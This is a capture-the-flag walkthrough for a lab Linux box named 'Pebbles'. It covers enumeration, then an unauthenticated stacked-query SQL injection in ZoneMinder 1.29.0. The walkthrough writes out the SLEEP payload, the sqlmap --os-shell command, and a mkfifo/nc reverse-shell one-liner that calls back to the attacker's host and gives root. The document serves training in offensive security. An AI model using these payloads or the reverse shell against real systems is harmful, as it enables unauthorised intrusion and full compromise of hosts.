---
title: "Pebbles - Writeup"
linkTitle: "Pebbles"
weight: 16
featured: true
platform: "PG"
name: "Pebbles"
os: "Linux"
difficulty: "Medium"
release: "26 Jul 2026"
ip: "192.168.135.52"
# Drop a real avatar at static/img/pg/pebbles.png and uncomment:
# avatar: "/img/pg/pebbles.png"
tags: ["linux", "zoneminder", "sqli", "stacked-queries", "sqlmap-os-shell", "root-shell"]
description: "Medium Linux box. An old ZoneMinder install has a time-based SQLi in its logging endpoint, and sqlmap's stacked-query OS shell lands directly as root."
---

{{< htb name="Pebbles" os="Linux" difficulty="Medium" release="26 Jul 2026" ip="192.168.135.52" platform="PG" >}}

## Reconnaissance

```
(root㉿kali)# nmap 192.168.135.52 -p21,22,80,8080,3305 -sCV
```

```
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Pebbles
3305/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Tomcat
|_http-open-proxy: Potentially OPEN proxy.
```

Three separate web services on the same host, port 80 is a named login page, worth starting there.

## Enumeration

Port 80 is a "Pebbles" branded login form.

![Pebbles login page rejecting admin:admin](/img/pg/pebbles/01-pebbles-login.png)

Default credentials fail here, `admin:admin` returns "Incorrect username or password". Fuzz for other content instead.

```
(root㉿kali)# ffuf -u http://192.168.135.52/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -c -e .php,.html
```

```
css          [Status: 301]
javascript   [Status: 301]
images       [Status: 301]
zm           [Status: 301]
```

`/zm` is a **ZoneMinder** console.

![ZoneMinder Console version 1.29.0](/img/pg/pebbles/02-zoneminder-console.png)

ZoneMinder 1.29.0 has multiple documented vulnerabilities, including an unauthenticated SQL injection in its logging endpoint.

## Initial Foothold

Confirm the injection with a time-based test first.

```
view=request&request=log&task=query&limit=100;SELECT SLEEP(5)#&minTime=1785083749.494510
```

![Burp Repeater showing a ~6 second delay confirming the stacked-query SQLi](/img/pg/pebbles/03-burp-sqli-confirmation.png)

A roughly 6-second delay confirms the injection point in the `limit` parameter. Save the full raw request and hand it to sqlmap.

```
(root㉿kali)# sqlmap -r r --batch --dbms mysql --os-shell
```

```
Parameter: limit (POST)
    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: view=request&request=log&task=query&limit=100;SELECT SLEEP(5)#&minTime=1785083749.494510
```

sqlmap confirms stacked queries are possible, meaning arbitrary SQL, including `SELECT ... INTO OUTFILE` for webshell writes, can ride along in the same request. Drop straight into the OS shell it offers.

```
os-shell> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.220 3305 >/tmp/f
```

```
(root㉿kali)# nc -lnvp 3305
```

```
connect to [192.168.45.220] from (UNKNOWN) [192.168.135.52] 40352
/bin/sh: 0: can't access tty; job control turned off
#
```

## Privilege Escalation

None needed. The stacked-query shell lands as `root` immediately, MySQL on this box runs with enough privilege that sqlmap's OS shell is already fully privileged.

```
# cd /root
# cat proof.txt
```

```
22cf1e8215cb05cc70751228046efe41
```

## Lessons learned

- A failed default-credential attempt is a dead end for that specific form, not for the whole box. Fuzzing straight past it turned up a completely separate application (`/zm`) with its own, much more exploitable surface.
- Confirm SQLi with a harmless time-based payload before reaching for sqlmap. A single `SLEEP()` test validated the injection point and gave sqlmap an exact, already-proven parameter to target.
- `--os-shell` needs stacked queries to work, and stacked queries are MySQL-specific behavior, always pass `--dbms` when it's already known, it saves sqlmap from re-detecting what's already confirmed.
